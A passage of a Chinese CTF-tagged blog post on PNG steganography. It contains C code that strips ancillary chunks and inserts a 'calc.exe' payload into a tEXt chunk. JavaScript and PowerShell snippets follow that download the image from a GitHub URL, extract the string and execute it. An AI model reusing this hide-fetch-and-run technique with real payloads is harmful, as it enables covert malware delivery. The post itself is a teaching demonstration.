class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(unsignedchar*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">           <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                       Crc= i;        </div><div class="line">                       <span class="keyword">for</span> (j = <span class="number">0</span>;j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                   <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                               Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                   <span class="keyword">else</span>       </div><div class="line">                                               Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                       &#125;        </div><div class="line">                       Crc32Table[i]= Crc;        </div><div class="line">           &#125;        </div><div class="line">           Crc=<span class="number">0xffffffff</span>;        </div><div class="line">           <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;         </div><div class="line">                       Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^InStr[m]];        </div><div class="line">           &#125;     </div><div class="line">           Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">           <span class="keyword">return</span> Crc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">           FILE *fp,*fpnew;   </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;         </div><div class="line">           <span class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;        </div><div class="line">           <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\0.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                       return0;  </div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">           len=ftell(fp);</div><div class="line">           buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">           fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">           fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">           <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">           fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">           ChunkOffset=<span class="number">8</span>;</div><div class="line">           i=<span class="number">0</span>;</div><div class="line">           fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">           <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">           &#123;</div><div class="line">                       i++;</div><div class="line">                       j=<span class="number">0</span>;</div><div class="line">                       <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                      fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                       <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                       &#123;           </div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                   fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                   fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                   j=<span class="number">1</span>;</div><div class="line">                       &#125;</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"  ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkLen:%10d             \n"</span>,ChunkLen);</div><div class="line">                       crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                       fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                       ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                       <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32:%08X                    "</span>,ChunkCRC32);</div><div class="line">                       <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                       <span class="keyword">else</span></div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                   <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                               fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                       &#125;</div><div class="line">                       ChunkLen=ftell(fp);</div><div class="line">                       <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                       &#123;</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                   <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                       </div><div class="line">                                   <span class="keyword">break</span>;</div><div class="line">                       &#125;</div><div class="line">           &#125;</div><div class="line">           fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">           fclose(fp);</div><div class="line">           fclose(fpnew);</div><div class="line">           return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="0x05-写入payload"><a class="markdownIt-Anchor" href="#0x05-写入payload"></a> 0x05-写入Payload</h2>
<p>实例：按照辅助数据块的格式写入Payload</p>
<p>写入的Payload为:calc.exe</p>
<p>辅助数据块设置为：tEXt(文本信息数据块)</p>
<p>对应的完整数据块结构如下：</p>
<p>Length: 0000 00 08</p>
<p>Chunk Type Code： 74 45 58 74</p>
<p>Chunk Data：63 61 6c 63 2e 65 78 65</p>
<p>CRC：fa c4 08 76</p>
<p>写入的十六进制数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">00 00 00 08 74 45 58 74 63 61 6c 63 2e 6578 65 fa c4 08 76</div></pre></td></tr></table></figure>
<p>注： 本实例仅作演示，实际使用可换成其他数据块，更加隐蔽</p>
<ol>
<li>工具实现</li>
</ol>
<p>使用Hex Friend插入数据，如图</p>
<p>保存后，不影响PNG文件浏览</p>
<ol start="2">
<li>程序实现</li>
</ol>
<p>去掉PNG文件所有的辅助数据块后，写入payload数据块tEXt</p>
<p>保存为addpayload.cpp,完整代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">GetCrc32</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*InStr,<span class="keyword">unsigned</span> <span class="keyword">int</span> len)</span></span>&#123;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc32Table[<span class="number">256</span>];      </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i,j;        </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> Crc;        </div><div class="line">            <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)&#123;        </div><div class="line">                        Crc= i;        </div><div class="line">                        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)&#123;        </div><div class="line">                                    <span class="keyword">if</span>(Crc &amp; <span class="number">1</span>)        </div><div class="line">                                                Crc= (Crc &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>;        </div><div class="line">                                    <span class="keyword">else</span>       </div><div class="line">                                                Crc&gt;&gt;= <span class="number">1</span>;      </div><div class="line">                        &#125;        </div><div class="line">                        Crc32Table[i]= Crc;        </div><div class="line">            &#125;        </div><div class="line">            Crc=<span class="number">0xffffffff</span>;        </div><div class="line">            <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span> m=<span class="number">0</span>; m&lt;len; m++)&#123;          </div><div class="line">                        Crc= (Crc &gt;&gt; <span class="number">8</span>) ^ Crc32Table[(Crc &amp; <span class="number">0xFF</span>) ^ InStr[m]];        </div><div class="line">            &#125;</div><div class="line">            Crc^= <span class="number">0xFFFFFFFF</span>;     </div><div class="line">            returnCrc;        </div><div class="line">&#125;       </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">convertStrToUnChar</span><span class="params">(<span class="keyword">char</span>* str, <span class="keyword">unsigned</span> <span class="keyword">char</span>* UnChar)</span>  </span></div><div class="line">&#123;  </div><div class="line">            inti = <span class="built_in">strlen</span>(str), j = <span class="number">0</span>, counter = <span class="number">0</span>;  </div><div class="line">            charc[<span class="number">2</span>];  </div><div class="line">            unsignedint bytes[<span class="number">2</span>];  </div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; i; j += <span class="number">2</span>)   </div><div class="line">            &#123;  </div><div class="line">                        <span class="keyword">if</span>(<span class="number">0</span>== j % <span class="number">2</span>)  </div><div class="line">                        &#123;  </div><div class="line">                                    c[<span class="number">0</span>]= str[j];  </div><div class="line">                                    c[<span class="number">1</span>]= str[j + <span class="number">1</span>];  </div><div class="line">                                    <span class="built_in">sscanf</span>(c,<span class="string">"%02x"</span> , &amp;bytes[<span class="number">0</span>]);  </div><div class="line">                                    UnChar[counter]= bytes[<span class="number">0</span>];  </div><div class="line">                                    counter++;  </div><div class="line">                        &#125;  </div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">return</span>;  </div><div class="line">&#125;    </div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">AddPayload</span><span class="params">(FILE *fp)</span></span></div><div class="line">&#123;</div><div class="line">            <span class="keyword">char</span>*Payload=<span class="string">"calc.exe"</span>;</div><div class="line">            unsignedchar *buf;</div><div class="line">            intlen;</div><div class="line">            intcrc32;</div><div class="line">            len=<span class="built_in">strlen</span>(Payload); </div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len+<span class="number">12</span>];</div><div class="line">            buf[<span class="number">0</span>]=len&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">1</span>]=len&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">2</span>]=len&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">3</span>]=len&amp;<span class="number">0xff</span>;</div><div class="line">            buf[<span class="number">4</span>]=<span class="string">'t'</span>;</div><div class="line">            buf[<span class="number">5</span>]=<span class="string">'E'</span>;</div><div class="line">            buf[<span class="number">6</span>]=<span class="string">'X'</span>;</div><div class="line">            buf[<span class="number">7</span>]=<span class="string">'t'</span>;</div><div class="line">            <span class="keyword">for</span>(intj=<span class="number">0</span>;j&lt;len;j++)</div><div class="line">                        buf[j+<span class="number">8</span>]=Payload[j];</div><div class="line">            buf[len+<span class="number">8</span>]=<span class="number">0XFA</span>;</div><div class="line">            buf[len+<span class="number">9</span>]=<span class="number">0XC4</span>;</div><div class="line">            buf[len+<span class="number">10</span>]=<span class="number">0X08</span>;</div><div class="line">            buf[len+<span class="number">11</span>]=<span class="number">0X76</span>;</div><div class="line">            fwrite(buf,len+<span class="number">12</span>,<span class="number">1</span>,fp);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line">&#123;</div><div class="line">            FILE*fp,*fpnew;   </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf=<span class="literal">NULL</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> len=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkLen=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkCRC32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> ChunkOffset=<span class="number">0</span>;         </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> crc32=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> Signature[<span class="number">8</span>]=&#123;<span class="number">0x89</span>,<span class="number">0x50</span>,<span class="number">0x4e</span>,<span class="number">0x47</span>,<span class="number">0x0d</span>,<span class="number">0x0a</span>,<span class="number">0x1a</span>,<span class="number">0x0a</span>&#125;;          </div><div class="line">            <span class="keyword">unsigned</span> <span class="keyword">char</span> IEND[<span class="number">12</span>]=&#123;<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x45</span>,<span class="number">0x4e</span>,<span class="number">0x44</span>,<span class="number">0xae</span>,<span class="number">0x42</span>,<span class="number">0x60</span>,<span class="number">0x82</span>&#125;;         </div><div class="line">            <span class="keyword">if</span>((fp=fopen(<span class="string">"c:\\test\\test.png"</span>,<span class="string">"rb+"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            <span class="keyword">if</span>((fpnew=fopen(<span class="string">"c:\\test\\new.png"</span>,<span class="string">"wb"</span>))==<span class="literal">NULL</span>)</div><div class="line">                        return0;  </div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_END);</div><div class="line">            len=ftell(fp);</div><div class="line">            buf=newunsigned <span class="keyword">char</span>[len];</div><div class="line">            fseek(fp,<span class="number">0</span>,SEEK_SET);</div><div class="line">            fread(buf,len,<span class="number">1</span>,fp);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"TotalLen=%d\n"</span>,len);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"----------------------------------------------------\n"</span>);</div><div class="line">            fseek(fp,<span class="number">8</span>,SEEK_SET);</div><div class="line">            ChunkOffset=<span class="number">8</span>;</div><div class="line">            i=<span class="number">0</span>;</div><div class="line">            fwrite(Signature,<span class="number">8</span>,<span class="number">1</span>,fpnew);</div><div class="line">            <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">            &#123;</div><div class="line">                        i++;</div><div class="line">                        j=<span class="number">0</span>;</div><div class="line">                        <span class="built_in">memset</span>(buf,<span class="number">0</span>,len);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        ChunkLen=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        fread(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fp);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"[+]ChunkName:%c%c%c%c                 "</span>,buf[<span class="number">0</span>],buf[<span class="number">1</span>],buf[<span class="number">2</span>],buf[<span class="number">3</span>]);</div><div class="line">                        <span class="keyword">if</span>(<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"IHDR"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span>*)buf,<span class="string">"PLTE"</span>,<span class="number">4</span>)==<span class="number">0</span>|<span class="built_in">strncmp</span>((<span class="keyword">char</span> *)buf,<span class="string">"IDAT"</span>,<span class="number">4</span>)==<span class="number">0</span>)</div><div class="line">                        &#123;           </div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"PaletteChunk\n"</span>);</div><div class="line">                                    fwrite(buf,<span class="number">4</span>+ChunkLen,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"AncillaryChunk\n"</span>);</div><div class="line">                                    fseek(fpnew,<span class="number">-4</span>,SEEK_CUR);</div><div class="line">                                    j=<span class="number">1</span>;</div><div class="line">                        &#125;</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkOffset:0x%08x       \n"</span>,ChunkOffset);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkLen: %10d              \n"</span>,ChunkLen);</div><div class="line">                        crc32=GetCrc32(buf,ChunkLen+<span class="number">4</span>);</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ExpectCRC32:%08X\n"</span>,crc32);</div><div class="line">                        fread(buf,<span class="number">4</span>,<span class="number">1</span>,fp);</div><div class="line">                        ChunkCRC32=(buf[<span class="number">0</span>]&lt;&lt;<span class="number">24</span>)|(buf[<span class="number">1</span>]&lt;&lt;<span class="number">16</span>)|(buf[<span class="number">2</span>]&lt;&lt;<span class="number">8</span>)|buf[<span class="number">3</span>];</div><div class="line">                        <span class="built_in">printf</span>(<span class="string">"   ChunkCRC32: %08X                     "</span>,ChunkCRC32);</div><div class="line">                        <span class="keyword">if</span>(crc32!=ChunkCRC32)</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"[!]CRC32CheckError!\n"</span>);</div><div class="line">                        <span class="keyword">else</span></div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"CheckSuccess!\n\n"</span>);</div><div class="line">                                    <span class="keyword">if</span>(j==<span class="number">0</span>)</div><div class="line">                                                fwrite(buf,<span class="number">4</span>,<span class="number">1</span>,fpnew);</div><div class="line">                        &#125;</div><div class="line">                        ChunkLen=ftell(fp);</div><div class="line">                        <span class="keyword">if</span>(ChunkLen==(len<span class="number">-12</span>))</div><div class="line">                        &#123;</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"\n----------------------------------------------------\n"</span>);</div><div class="line">                                    <span class="built_in">printf</span>(<span class="string">"TotalChunk:%d\n"</span>,i);                        </div><div class="line">                                    <span class="keyword">break</span>;</div><div class="line">                        &#125;</div><div class="line">            &#125;</div><div class="line">            AddPayload(fpnew);</div><div class="line">            fwrite(IEND,<span class="number">12</span>,<span class="number">1</span>,fpnew);</div><div class="line">            fclose(fp);</div><div class="line">            fclose(fpnew);</div><div class="line">            return0;         </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用check.cpp对其进行校验，如图，校验成功</p>
<h2 id="0x06-读取payload并执行"><a class="markdownIt-Anchor" href="#0x06-读取payload并执行"></a> 0x06-读取payload并执行</h2>
<p>将添加payload的图片上传至github，在客户端实现读取图片解析payload并执行：</p>
<ol>
<li>javascript</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = newActiveXObject(<span class="string">"WinHttp.WinHttpRequest.5.1"</span>);</div><div class="line">h.SetTimeouts(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">h.Open(<span class="string">"GET"</span>,<span class="string">"https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master//new.png"</span>,<span class="literal">false</span>);</div><div class="line">h.Send();</div><div class="line">Data = h.ResponseText;</div><div class="line">x=Data.indexOf(<span class="string">"tEXt"</span>);</div><div class="line">y=Data.indexOf(<span class="string">"IEND"</span>);</div><div class="line">str=Data.substring(x+<span class="number">4</span>,y<span class="number">-8</span>);</div><div class="line">newActiveXObject(<span class="string">"WScript.Shell"</span>).Run(str);</div></pre></td></tr></table></figure>
<ol start="2">
<li>powershell</li>
</ol>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$url</span> = <span class="string">'https://raw.githubusercontent.com/3gstudent/PNG-Steganography/master/new.png'</span></div><div class="line"><span class="variable">$request</span> = <span class="built_in">New-Object</span> System.Net.WebCLient</div><div class="line"><span class="variable">$bytes</span> = <span class="variable">$request</span>.DownloadString(<span class="variable">$url</span>)</div><div class="line"><span class="variable">$x</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"tEXt"</span>)</div><div class="line"><span class="variable">$y</span>=<span class="variable">$bytes</span>.indexof(<span class="string">"IEND"</span>)</div><div class="line"><span class="variable">$str</span>=<span class="variable">$bytes</span>.Substring(<span class="variable">$x</span>+<span class="number">4</span>,<span class="variable">$y</span>-<span class="variable">$x</span>-<span class="number">12</span>)</div><div class="line"><span class="built_in">Start-Process</span> -FilePath <span class="variable">$str</span></div></pre></td></tr></table></figure>
<p>注:这里给出两种方法，仅作演示</p>

        </div>
        
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    Last updated: <time datetime="2017-11-04T09:54:25.000Z" itemprop="dateUpdated">2017-11-04 17:54:25</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2017/10/29/PNG在隐写中的应用/" target="_blank" rel="external">http://yoursite.com/2017/10/29/PNG在隐写中的应用/</a>
        
    </div>
    <footer>
        <a href="http://yoursite.com">
            <img src="/img/miao_icon.jpg" alt="Peter pan">
            Peter pan
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2017/10/29/PNG在隐写中的应用/&title=《PNG在隐写中的应用》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2017/10/29/PNG在隐写中的应用/&title=《PNG在隐写中的应用》 — Peterpan's Blog&source=让我们一起来了解一下png图片的构成吧～知其然亦知其所以然" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            
    <div id="comment"></div>


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2017/10/30/CTF-图像学基础/" id="post-prev" class="post-nav-link">
